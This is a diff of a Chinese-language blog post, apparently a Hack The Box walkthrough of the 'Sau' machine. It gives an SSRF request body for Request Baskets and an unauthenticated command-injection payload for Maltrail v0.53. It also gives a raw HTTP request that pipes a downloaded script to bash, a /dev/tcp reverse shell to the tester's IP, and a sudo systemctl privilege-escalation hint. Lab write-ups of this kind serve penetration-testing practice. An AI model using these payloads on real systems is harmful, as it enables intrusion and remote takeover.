@@ -8,7 +8,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp">
     <title>
         
-            归档
+            HTB_Sau
         
     </title>
     <link rel="shortcut icon" href="#"/>
@@ -31,15 +31,36 @@
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body>
     <a id="cover"></a>
-    <link type="text/css" rel="stylesheet" href="/css/archive.css">
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
 <div id="header" class="header">
     <div class="vertical">
         <div class="inner">
             
-                <h1 class="header-subtitle">归档</h1>
+                <h1 class="header-subtitle">HTB_Sau</h1>
                 <div class="header-subinfo">
-                    <p class="article-info-text Chinese"></p>
-                    <p class="article-info-text English"></p>                  
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2023-10-16
+                        </span>
+                        
+                            <span id="/2023/10/16/HTB-Sau/" class="leancloud_visitors" data-flag-title="HTB_Sau">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/10/16/HTB-Sau/"></span>
+                        </span>  
+                    </p>
+                    
+                        
+                            <span class="category-color">HTB</span>
+                        
+                    
+                    
+                        
+                            <span class="tag-color">HTB</span>
+                        
+                    
                 </div>
             
         </div>
@@ -48,45 +69,98 @@
 </div>
 <div id="container">
     
-        
-            <!-- 归档页面、分类归档页面、标签归档页面 -->
-            <div class="articles">
-                <div class="articles-wrap">
-                    <span class="archive-move-on"></span>
-                    <span class="archive-counter">
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <p>s</p>
+<p>开始简单namp 扫描 两个端口，22和55555 很奇怪没有80端口</p>
+<p>主动扫描一下发现 被过滤了 80端口也是一个http服务 </p>
+<p>那就先从55555端口下手发现了一个服务 reques baskets 1.2.1版本 漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://notes.sjtu.edu.cn/s/MUUhEymt7#">https://notes.sjtu.edu.cn/s/MUUhEymt7#</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">request baskets服务存在api接口/api/baskets/&#123;name&#125;，/baskets/&#123;name&#125;，这里的name可以任意，这些接口会接收一个forward_url参数，而这个参数存在SSRF漏洞。</span><br><span class="line"></span><br><span class="line">向/api/baskets/&#123;name&#125;发送forward_url参数后，需要访问10.10.11.224:55555/&#123;name&#125;来触发SSRF漏洞（请求给定的forward_url）。</span><br><span class="line"></span><br><span class="line">可以实现55555端口访问其他端口内容的效果（如直接访问80端口被拦截，但是通过这个SSRF漏洞，让靶机主机访问80端口，再把内容显示在55555端口）。</span><br><span class="line"></span><br><span class="line">访问url：/api/baskets/rktest（rktest是随意取的），然后burp抓包，进行如下修改：</span><br><span class="line"></span><br><span class="line">GET改成POST，请求体内容为：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;forward_url&quot;: &quot;http://127.0.0.1:80/&quot;,</span><br><span class="line">  &quot;proxy_response&quot;: true,</span><br><span class="line">  &quot;insecure_tls&quot;: false,</span><br><span class="line">  &quot;expand_path&quot;: true,</span><br><span class="line">  &quot;capacity&quot;: 250</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">forward_url是请求的url，因为不知道80端口的网站具体有什么内容，所以是路径直接是/。</span><br><span class="line">proxy_response设置为true，应该是控制是否将请求的url内容转发过来。</span><br><span class="line">发送，返回token：iyU0YOQ2aZP9rqdWHqUusBbhxW9_1_Sh-AJQ0jyq03Dj</span><br><span class="line">此时去访问：10.10.11.224:55555/rktest，显示了靶机80端口的网页</span><br></pre></td></tr></table></figure>
+
+<p>80端口发现了 Maltrail (v0.53)  找一下他的漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">在 maltrail 中发现的 stamparm&#x2F;maltrail 漏洞中未经身份验证的操作系统命令注入 (huntr.dev)</a></p>
+<p>这个漏洞要login页面，再重复上面的动作 再来一次</p>
+<p>这里能访问login了 但是不知道漏洞能不能利用成 curl一下试试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>这边发包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=;`curl 10.10.14.7`</span><br></pre></td></tr></table></figure>
+
+<p>这里成功收到，说明可以进行利用，详细的话见 CozyHosting里面的方法</p>
+<p>卧槽bash sh 都不行</p>
+<p>那就curl刚才不是成了么</p>
+<p>用curl 反弹shell   本地文件写的 1     bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.7&#x2F;8000 0&gt;&amp;1 这边直接运行就行 没什么限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /zyhm1 HTTP/1.1</span><br><span class="line">Host: 10.10.11.224:55555</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">username=;`curl%2010.10.14.7/1|bash`</span><br></pre></td></tr></table></figure>
+
+<p>上线之后直接拿到user.txt   然后想办法提权</p>
+<p>很经典   sudo -l</p>
+<p>发现 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/systemctl status trail.service</span><br></pre></td></tr></table></figure>
+
+<p>这个可以利用</p>
+<p>然后  在<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/systemctl/#sudo">systemctl | GTFOBins</a></p>
+<p>这里面找提权方法 直接提就好了</p>
+<p>结束</p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/touxiang.jpg" alt="章鱼海绵">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>章鱼海绵
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2023/10/16/HTB-Sau/" target="_blank">HTB_Sau</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                    <div class="category">
+                        分类：
                         
-                            目前共计 35 篇日志，继续加油！
+                            <a href="/categorie/HTB/">HTB</a>
                         
-                    </span>
+                    </div>
+                
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="/tag/HTB/">HTB</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
                     
                     
-                        
-                            <div class="archive-title">
-                                <h2 class="archive-year">2023</h2>
-                            </div>
-                            
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/03/04/burp%E5%AE%8F%E5%AE%9A%E4%B9%89%E7%BB%95%E8%BF%87%E7%88%86%E7%A0%B4/"><span>burp宏定义绕过爆破</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">03-04</span>
-                                </div>
-                            </div>
-                        </div>
+                        <a href="/2023/10/15/HTB-CozyHosting/" class="next-prefix">» </a> 下一篇：    <a href="/2023/10/15/HTB-CozyHosting/" title="发布于 2023-10-15 11:43">HTB_CozyHosting</a>
                     
                 </div>
             </div>
             
+    <div class="article-comments">
         
-    <div class="pagination-bottom">
-        <div class="pagination">
-            
-                <a class="extend prev" rel="prev" href="/archive/2023/03/">上一页</a><a class="page-number" href="/archive/2023/03/">1</a><span class="page-number current">2</span>
-            
-        </div>
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
     </div>
 
+        </div>
     
 </div>
     <div id="footer"></div>
@@ -118,7 +192,7 @@
                     
                         <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
                     
-                        <li class=" active "><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
                     
                         <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
                     
